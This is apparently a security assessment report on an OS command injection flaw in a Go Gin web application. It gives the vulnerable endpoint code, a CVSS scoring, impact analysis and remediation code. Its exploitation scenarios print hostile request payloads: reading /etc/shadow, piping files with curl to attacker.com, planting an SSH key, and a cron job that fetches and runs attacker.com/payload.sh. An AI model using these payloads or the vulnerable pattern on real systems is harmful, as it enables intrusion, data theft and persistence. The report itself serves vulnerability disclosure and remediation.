# OS Command Injection via Unsanitized User Input in Go Application

# Vulnerability Case
During a routine security assessment of Acme Corp's web application built using the Go programming language and the Gin framework on a Linux platform, we discovered that unsanitized user input was being directly passed to the system shell via the `exec.Command` function. The vulnerable endpoint accepted a query parameter that was concatenated into a shell command using `bash -c` without proper sanitization, allowing an attacker to inject arbitrary commands. This issue was identified through both source code review and controlled HTTP requests that demonstrated unexpected command execution. Exploiting this vulnerability could enable an adversary to execute arbitrary code, escalate privileges, and ultimately compromise the entire system. This endpoint is only accessible from the internal network via VPN and requires administrative credentials due to authentication middleware.

```go
package main

import (
        "net/http"
        "os/exec"

        "github.com/gin-gonic/gin"
)

func main() {
        r := gin.Default()
        // Vulnerable endpoint: unsanitized command input leading to command injection
        r.GET("/execute", func(c *gin.Context) {
                // User-supplied input without proper sanitization
                userCmd := c.Query("cmd")
                // Directly injecting user input into a shell command via bash -c
                output, err := exec.Command("bash", "-c", userCmd).CombinedOutput()
                if err != nil {
                        c.String(http.StatusInternalServerError, string(output))
                        return
                }
                c.String(http.StatusOK, string(output))
        })
        r.Run(":8080")
}
```

The exploitation method involves crafting malicious input (e.g., using semicolons, ampersands, or other shell metacharacters) that, when passed through the vulnerable endpoint, causes the shell to execute additional commands beyond the original intent. An attacker could, for example, append commands to exfiltrate sensitive data or alter system configurations, leading to full system compromise. This vulnerability directly impacts business operations by potentially providing unauthorized access to critical infrastructure components and sensitive data, and may result in severe financial and reputational damage for Acme Corp.


context: go.gin.command-injection.gin-command-injection.gin-command-injection-taint Untrusted input might be injected into a command executed by the application, which can lead to a command injection vulnerability. An attacker can execute arbitrary commands, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing OS commands with user input. If this is unavoidable, validate and sanitize the input, and use safe methods for executing the commands. In Go, it is possible to use the `exec.Command` function in combination with the `bash -c` command to run the user input as a shell command. To sanitize the user input, you can use a library like `shellescape` to escape any special characters before constructing the command. For more information, see: [Go command injection prevention](https://semgrep.dev/docs/cheat-sheets/go-command-injection/)

# Vulnerability Breakdown
This vulnerability involves direct execution of unsanitized user input via shell commands in a Go web application using the Gin framework, though access is restricted to the internal network and requires administrative privileges.

1. **Key vulnerability elements**:
   - User-supplied input from a query parameter is passed directly to `exec.Command`
   - The command is executed using `bash -c`, which interprets shell metacharacters
   - No input validation or sanitization is performed
   - The endpoint is only accessible via internal network with VPN access
   - Administrative credentials are required due to authentication middleware
   - Both successful and failed command outputs are returned to the user

2. **Potential attack vectors**:
   - Injection of shell metacharacters (;, &&, ||, |, etc.) to chain arbitrary commands
   - Use of command redirectors (>, >>) to write to the filesystem
   - Data exfiltration through network commands (curl, wget, nc)
   - Privilege escalation through vulnerable system utilities
   - Environment variable manipulation or credential access

3. **Severity assessment**:
   - Adjacent attack vector (internal network requiring VPN access)
   - No special conditions required to exploit (low complexity)
   - High privileges required (administrative credentials)
   - No user interaction required
   - Successful exploitation grants complete system access at the application's privilege level
   - High impact on confidentiality, integrity, and availability

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Adjacent (A) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): High (H) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

# Description
A command injection vulnerability has been discovered in Acme Corp's Go web application built with the Gin framework. The application contains an endpoint at `/execute` that directly passes user-supplied query parameters to the system shell without any validation or sanitization. This endpoint is only accessible from the internal network via VPN and requires administrative credentials due to authentication middleware.

```go
r.GET("/execute", func(c *gin.Context) {
    // User-supplied input without proper sanitization
    userCmd := c.Query("cmd")
    // Directly injecting user input into a shell command via bash -c
    output, err := exec.Command("bash", "-c", userCmd).CombinedOutput()
    if err != nil {
        c.String(http.StatusInternalServerError, string(output))
        return
    }
    c.String(http.StatusOK, string(output))
})

```

The vulnerability is serious because:

1. It uses `bash -c` which interprets shell metacharacters, allowing command chaining
2. Both successful and error outputs are returned to the user, aiding exploitation
3. The application runs on a Linux server, providing access to powerful system utilities

Despite the restricted access requirements (VPN and admin credentials), this vulnerability allows authenticated administrators to execute arbitrary commands with the privileges of the application process, potentially leading to system compromise, data theft, and service disruption.

# CVSS
**Score**: 6.8 \
**Vector**: CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H \
**Severity**: Medium

This vulnerability receives a Medium severity rating (6.8) based on the following factors:

- **Adjacent Attack Vector (AV:A)**: The vulnerability is only exploitable from the internal network requiring VPN access, not remotely from the internet.

- **Low Attack Complexity (AC:L)**: Despite the access restrictions, exploitation remains straightforward and requires no special conditions or preparation. Simple HTTP requests with crafted query parameters are sufficient to exploit the vulnerability once access is obtained.

- **High Privileges Required (PR:H)**: Administrative credentials are required to access the vulnerable endpoint due to authentication middleware, significantly limiting the potential attacker pool.

- **No User Interaction Required (UI:N)**: The vulnerability can be exploited without any action from a legitimate user.

- **Unchanged Scope (S:U)**: The vulnerability affects resources managed by the same security authority. While attackers may pivot to other systems, the initial impact is contained within the vulnerable application's authorization scope.

- **High Confidentiality Impact (C:H)**: Attackers can gain complete access to all data stored on the system, including sensitive configuration files, credentials, and application data.

- **High Integrity Impact (I:H)**: Attackers can modify any files accessible to the application user, potentially altering application behavior, injecting malicious code, or corrupting data.

- **High Availability Impact (A:H)**: Attackers can execute commands that crash the application, consume system resources, or otherwise render the service unavailable.

The severity is reduced from Critical to Medium primarily due to the restricted attack vector (requiring internal network access with VPN) and the need for administrative credentials, which significantly limits the exploitation potential compared to an internet-accessible, unauthenticated endpoint.

# Exploitation Scenarios
**Scenario 1: Malicious Administrator**

A disgruntled system administrator with valid administrative credentials and VPN access exploits the vulnerability to exfiltrate sensitive data:

```
GET /execute?cmd=cat%20/etc/passwd%3B%20cat%20/etc/shadow%3B%20find%20/%20-name%20%22*.conf%22%20-type%20f%20-exec%20grep%20-l%20password%20%7B%7D%20\%3B

```

This command chain reads system user information, attempts to access password hashes, and searches for configuration files containing password strings. The attacker then exfiltrates this data:

```
GET /execute?cmd=cat%20/path/to/sensitive/file%20|%20curl%20-X%20POST%20-d%20@-%20https://attacker.com/collector

```

**Scenario 2: Compromised Admin Credentials**

An external attacker who has obtained administrative credentials through phishing and has VPN access establishes persistence:

```
GET /execute?cmd=mkdir%20-p%20~/.ssh%20%26%26%20echo%20%22ssh-rsa%20AAAA...%22%20%3E%3E%20~/.ssh/authorized_keys

```

This adds the attacker's SSH key to the authorized keys file. Alternatively, they could create a cron job for a reverse shell:

```
GET /execute?cmd=(crontab%20-l%202%3E/dev/null%3B%20echo%20%22*%20*%20*%20*%20*%20curl%20-s%20https://attacker.com/payload.sh%20|%20bash%22)%20|%20crontab%20-

```

**Scenario 3: Insider Threat Network Exploration**

A malicious insider with administrator access uses the vulnerability to explore the internal network:

```
GET /execute?cmd=ip%20addr%20show%3B%20netstat%20-tuln%3B%20ping%20-c%201%20192.168.1.1

```

The attacker identifies other systems and services, then attempts lateral movement:

```
GET /execute?cmd=nmap%20-sT%20-p%2022,80,443,3306,5432%20192.168.1.0/24%20--open

```

**Scenario 4: Third-Party Contractor Access**

A third-party contractor with temporary administrative access for maintenance purposes exceeds their authorization:

```
GET /execute?cmd=find%20/%20-name%20"*.go"%20-type%20f%20-exec%20grep%20-l%20"password"%20{}%20\;

```

After finding credentials in the source code or configuration files, they might extract sensitive business information or plant backdoors for later access.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive customer data could lead to regulatory violations (GDPR, CCPA, etc.) if exploited by a malicious administrator or someone with stolen admin credentials
- Financial losses from operational disruption during incident response
- Legal liability from data breach notification requirements and potential lawsuits
- Reputational damage if a breach occurs and is disclosed
- Potential intellectual property theft if proprietary information is accessed
- Costs associated with forensic investigation, remediation, and security improvements
- Insider threat risk from administrators abusing their access
- Trust issues with third-party contractors who might have administrative access

**Technical Impact:**
- Complete system compromise at the application's privilege level, though limited to users with administrative credentials and VPN access
- Unauthorized access to all data readable by the application process
- Ability to modify or delete critical application and system files
- Potential privilege escalation through local vulnerabilities
- Lateral movement to other systems on the internal network
- Infrastructure manipulation affecting network configurations and security controls
- Service disruption through resource exhaustion or deliberate sabotage
- Persistent access through backdoors, scheduled tasks, or unauthorized accounts
- Compromise of continuous integration/delivery pipelines if accessible
- Code injection into application repositories if source code management is reachable
- Access to database credentials and other sensitive configuration information
- Potential for supply chain attacks if the organization develops software for others

While the impact potential remains high, the actual risk is somewhat mitigated by the requirement for administrative credentials and internal network access, limiting the pool of potential attackers primarily to insiders or attackers who have already compromised admin credentials.

# Technical Details
The vulnerability exists in a Go application built with the Gin web framework and involves direct execution of user-supplied input as system commands without any validation or sanitization. The specific implementation issues are:

1. **Dangerous Command Construction**
   The application uses `exec.Command("bash", "-c", userCmd)` which passes the user input to a shell interpreter. This is particularly dangerous because:
   - `bash -c` evaluates the entire string as a shell command
   - Shell metacharacters like `;`, `&&`, `||`, `|`, `>`, and backticks have special meaning
   - Environment variables, wildcards, and other shell features are interpreted

```go
// The vulnerable code pattern
exec.Command("bash", "-c", userCmd).CombinedOutput()

```

2. **No Input Validation**
   The application takes the query parameter directly without any validation:

```go
userCmd := c.Query("cmd")

```

3. **Error Handling Reveals Information**
   The application returns command output to the user for both successful and failed commands, which helps attackers debug their exploitation attempts:

```go
if err != nil {
    c.String(http.StatusInternalServerError, string(output))
    return
}
c.String(http.StatusOK, string(output))

```

4. **Access Restrictions**
   While not visible in the code snippet provided, the endpoint is:
   - Only accessible from the internal network requiring VPN access
   - Protected by authentication middleware requiring administrative credentials

5. **Exploitation Mechanics**
   Command injection works by breaking out of the intended command context. For example, if an attacker sends:

```
GET /execute?cmd=ls%20-la%3Bcat%20/etc/passwd

```

The decoded query becomes `ls -la;cat /etc/passwd` and the application constructs:

```
bash -c "ls -la;cat /etc/passwd"

```

The shell interprets this as two separate commands:
1. `ls -la`
2. `cat /etc/passwd`

Other attack patterns include:
- Command chaining: `cmd1 && cmd2` (cmd2 runs if cmd1 succeeds)
- Alternative execution: `cmd1 || cmd2` (cmd2 runs if cmd1 fails)
- Command substitution: `` `cmd` `` or `$(cmd)` (output of cmd is substituted)
- Backgrounding: `cmd1 & cmd2` (runs both commands in parallel)
- Input/output redirection: `cmd > file` or `cmd < file`

This vulnerability is serious despite the access restrictions because:
1. It provides direct system command execution
2. It's trivial to exploit once access is obtained
3. It could be targeted by malicious insiders or attackers who have already compromised admin credentials
4. It can lead to system compromise within the scope accessible to the application

# Remediation Steps
## Replace Command Execution with Safe Alternatives

**Priority**: P0

The most secure approach is to eliminate the need for shell command execution entirely. Refactor the code to use Go's standard library or safe third-party packages to achieve the same functionality:

```go
// Instead of executing shell commands to list files
r.GET("/list-files", func(c *gin.Context) {
    // Validate directory path is within allowed boundaries
    dirPath := c.Query("dir")
    if !isPathSafe(dirPath) {
        c.String(http.StatusForbidden, "Path not allowed")
        return
    }
    
    // Use Go's file operations instead of shell commands
    files, err := ioutil.ReadDir(dirPath)
    if err != nil {
        c.String(http.StatusInternalServerError, err.Error())
        return
    }
    
    // Format and return results
    result := make([]map[string]interface{}, 0)
    for _, file := range files {
        result = append(result, map[string]interface{}{
            "name": file.Name(),
            "size": file.Size(),
            "isDir": file.IsDir(),
            "modified": file.ModTime(),
        })
    }
    c.JSON(http.StatusOK, result)
})

// Helper function to validate path safety
func isPathSafe(path string) bool {
    // Normalize path to prevent directory traversal
    cleanPath := filepath.Clean(path)
    
    // Check if path is within allowed directories
    allowedPrefixes := []string{
        "/var/www/public",
        "/tmp/app-data",
    }
    
    for _, prefix := range allowedPrefixes {
        if strings.HasPrefix(cleanPath, prefix) {
            return true
        }
    }
    return false
}

```

This approach:
1. Replaces generic command execution with specific endpoint functionality
2. Uses Go's standard library for file operations
3. Implements proper path validation and sanitization
4. Returns structured data rather than raw command output
## Implement Command Whitelisting and Parameter Separation

**Priority**: P1

If command execution absolutely cannot be avoided, implement strict whitelisting of allowed commands and proper parameter handling:

```go
func main() {
    r := gin.Default()
    
    r.GET("/execute", func(c *gin.Context) {
        // Get command name and validate against whitelist
        cmdName := c.Query("cmd")
        
        // Define whitelist of allowed commands
        allowedCommands := map[string]bool{
            "ls": true,
            "date": true,
            "echo": true,
            // Add other allowed commands
        }
        
        if !allowedCommands[cmdName] {
            c.String(http.StatusForbidden, "Command not allowed")
            return
        }
        
        // Get arguments as separate parameter and validate
        argsStr := c.Query("args")
        args := parseArgs(argsStr)
        
        // Validate each argument (implement based on command specifics)
        if !areArgumentsSafe(cmdName, args) {
            c.String(http.StatusForbidden, "Invalid arguments")
            return
        }
        
        // Execute command without shell interpretation by passing arguments separately
        cmd := exec.Command(cmdName, args...)
        
        // Set restricted environment if needed
        cmd.Env = []string{"PATH=/usr/bin:/bin"}
        
        // Execute with timeout for safety
        ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
        defer cancel()
        cmd = exec.CommandContext(ctx, cmdName, args...)
        
        output, err := cmd.CombinedOutput()
        if err != nil {
            // Log the error but don't return command output on error
            log.Printf("Command execution error: %v", err)
            c.String(http.StatusInternalServerError, "Error executing command")
            return
        }
        
        c.String(http.StatusOK, string(output))
    })
    
    r.Run(":8080")
}

func parseArgs(argsStr string) []string {
    if argsStr == "" {
        return []string{}
    }
    return strings.Split(argsStr, ",")
}

func areArgumentsSafe(cmdName string, args []string) bool {
    // Implement command-specific argument validation
    switch cmdName {
    case "ls":
        // Validate ls arguments (e.g., no arbitrary paths)
        for _, arg := range args {
            // Disallow arguments starting with dash except for specific options
            if strings.HasPrefix(arg, "-") {
                allowedOptions := map[string]bool{
                    "-l": true, "-a": true, "-la": true, "-al": true,
                }
                if !allowedOptions[arg] {
                    return false
                }
            } else {
                // Check if path is within allowed directories
                if !isPathSafe(arg) {
                    return false
                }
            }
        }
        return true
    // Add cases for other commands
    default:
        return false
    }
}

```

This implementation:
1. Restricts execution to a predefined set of allowed commands
2. Separates command name from arguments to avoid shell interpretation
3. Validates arguments based on command-specific rules
4. Uses exec.Command with separated arguments to prevent shell injection
5. Implements timeouts and restricted environment for damage limitation
6. Avoids returning error output that could aid attackers


# References
* CWE-78 | [Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
* CWE-77 | [Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html)
* CWE-94 | [Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* A04:2021 | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
